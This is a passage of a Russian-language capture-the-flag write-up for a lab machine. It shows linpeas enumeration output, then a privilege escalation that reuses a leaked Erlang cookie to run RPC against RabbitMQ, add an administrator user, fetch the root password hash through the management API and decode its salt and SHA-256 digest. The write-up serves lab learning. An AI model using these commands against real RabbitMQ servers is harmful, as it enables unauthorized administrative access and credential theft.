-rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/images/.DS_Store
-rw-r--r-- 1 root root 10244 Aug 15  2024 /var/www/storage.cloudsite.thm/scss/bootstrap/.DS_Store
-rw-r--r-- 1 root root 8196 Aug 15  2024 /var/www/storage.cloudsite.thm/scss/.DS_Store
-rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/fonts/.DS_Store
-rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/js/.DS_Store
-rw-r--r-- 1 landscape landscape 0 Mar 14  2023 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 0 Jul 18  2024 /etc/.java/.systemPrefs/.system.lock
-rw-r--r-- 1 root root 0 Jul 18  2024 /etc/.java/.systemPrefs/.systemRootModFile
-rw------- 1 root root 0 Mar 14  2023 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /etc/skel/.bash_logout
-rw------- 1 root root 0 Oct  2 03:10 /run/snapd/lock/.lock
-rw-r--r-- 1 root root 20 Oct  2 03:10 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Oct  2 03:10 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 azrael azrael 220 Feb 25  2020 /home/azrael/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxr-xr-x 1 azrael azrael 1001072 Jan 19  2026 /tmp/linpeas.sh                                                                                                                         
-rw-r--r-- 1 root root 51200 Jul 18  2024 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                        
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                                              
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-310.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-310.pyc
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation.app
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation_app.beam
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation.beam
/usr/lib/rabbitmq/lib/rabbitmq_server-3.9.13/plugins/credentials_obfuscation-2.4.0/ebin/credentials_obfuscation_pbe.beam
  #)There are more creds/passwds files in the previous parent folder


╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                        
╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                        
╔══════════╣ Searching passwords inside logs (limit 70)
/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:                                                                                                                 
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.47_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.8.1-1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.47) ...
/var/log/bootstrap.log:Setting up passwd (1:4.8.1-1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.47) over (3.5.47) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.8.1-1ubuntu5) ...
/var/log/dist-upgrade/20240815-0854/apt.log:  Installing libsemanage2 as Depends of passwd
/var/log/dist-upgrade/20240815-0854/apt.log:  MarkInstall passwd:amd64 < 1:4.8.1-1ubuntu5.20.04.5 -> 1:4.8.1-2ubuntu2.2 @ii umU Ib > FU=0
/var/log/dist-upgrade/apt.log:  Installing libsemanage2 as Depends of passwd
/var/log/dist-upgrade/apt.log:  MarkInstall passwd:amd64 < 1:4.8.1-1ubuntu5.20.04.5 -> 1:4.8.1-2ubuntu2.2 @ii umU Ib > FU=0
-#azrael ALL=(ALL) NOPASSWD: /usr/bin/imagecompress.sh
-#azrael ALL=(ALL) NOPASSWD: ALL
Get:340 http://in.archive.ubuntu.com/ubuntu jammy/main amd64 base-passwd amd64 3.5.52build1 [49.1 kB]
/var/log/dist-upgrade/screenlog.0:Preparing to unpack .../base-passwd_3.5.52build1_amd64.deb ...
/var/log/dist-upgrade/screenlog.0:Preparing to unpack .../passwd_1%3a4.8.1-2ubuntu2.2_amd64.deb ...
/var/log/dist-upgrade/screenlog.0:Setting up base-passwd (3.5.52build1) ...
/var/log/dist-upgrade/screenlog.0:Setting up passwd (1:4.8.1-2ubuntu2.2) ...
/var/log/dist-upgrade/screenlog.0:Unpacking base-passwd (3.5.52build1) over (3.5.47) ...
/var/log/dist-upgrade/screenlog.0:Unpacking passwd (1:4.8.1-2ubuntu2.2) over (1:4.8.1-1ubuntu5.20.04.5) ...
/var/log/dist-upgrade/screenlog.0:Writing passwd-file to /etc/passwd

╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
HOME=/home/azrael                                                                                                                                                                       
LANG=en_US.UTF-8
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
_=./linpeas.sh
LOGNAME=azrael
OLDPWD=//
PWD=/home/azrael/chatbotServer
PWD=//tmp
PYTHONUNBUFFERED=1
SHELL=/bin/bash
SHLVL=1
SHLVL=2
USER=azrael
_=/usr/bin/dd
_=/usr/bin/grep
_=/usr/bin/xxd
WERKZEUG_RUN_MAIN=true
WERKZEUG_SERVER_FD=3
WERKZEUG_SERVER_FD=4
```

PwnKit тут нету 


sudo тоже нельзя как то использовать


по скану видим что открыт куки rabbitmq, попробуем через него повысить привилегии 

```
zrael@forge:/tmp/az_home$ printf 'uOJn1gFOvRhmAmrX' > /tmp/az_home/.erlang.cookie
<tf 'uOJn1gFOvRhmAmrX' > /tmp/az_home/.erlang.cookie
azrael@forge:/tmp/az_home$ chmod 600 /tmp/az_home/.erlang.cookie

chmod 600 /tmp/az_home/.erlang.cookie
azrael@forge:/tmp/az_home$ 
azrael@forge:/tmp/az_home$ cat /tmp/az_home/.erlang.cookie; echo
cat /tmp/az_home/.erlang.cookie; echo
uOJn1gFOvRhmAmrX
azrael@forge:/tmp/az_home$ HOME=/tmp/az_home erl -sname azrael -noshell -eval '
  io:format("ping: ~p~n", [net_adm:ping(rabbit@forge)]),
  init:stop().
<OME=/tmp/az_home erl -sname azrael -noshell -eval '
>   io:format("ping: ~p~n", [net_adm:ping(rabbit@forge)]),
>   init:stop().
> 
'
ping: pong

```
проверил так же робит ли rabbit чи не 

```
[[{user,<<"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.">>},
  {tags,[]}],
 [{user,<<"root">>},{tags,[administrator]}]]
```
я поискал есть ли пользователи тут и че и как, по итогу вижу что если мы узнаем sha-256 от root RabbitMQ то получим пароль рута буквально.


я создал пользователя pwn и посмотреть пароль root

```
HOME=/tmp/az_home erl -sname azrael -noshell -eval '
  rpc:call(rabbit@forge, rabbit_auth_backend_internal, add_user,
           [<<"pwn">>, <<"pwn123">>, [administrator]]),
  init:stop().
'
azrael@forge:/tmp/az_home$ curl -s -u pwn:pwn123 http://localhost:15672/api/users/root | python3 -m json.tool

<calhost:15672/api/users/root | python3 -m json.tool

{
    "name": "root",
    "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
    "hashing_algorithm": "rabbit_password_hashing_sha256",
    "tags": [
        "administrator"
    ],
    "limits": {}
}
azrael@forge:/tmp/az_home$ 
```
```
echo "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 36

e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

e3d7ba85 - это соль, а это уже sha256 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

<img width="828" height="113" alt="{ED21F28B-9931-4FFD-B0BD-C8D7EDE5A593}" src="https://github.com/user-attachments/assets/80c6a5c2-df06-4337-b790-9f0b2266421b" />

<img width="824" height="482" alt="{ACDF1B8C-8599-4567-AE4E-6146A316A975}" src="https://github.com/user-attachments/assets/1a536357-fc6d-420e-b0be-5fcd58aef232" />


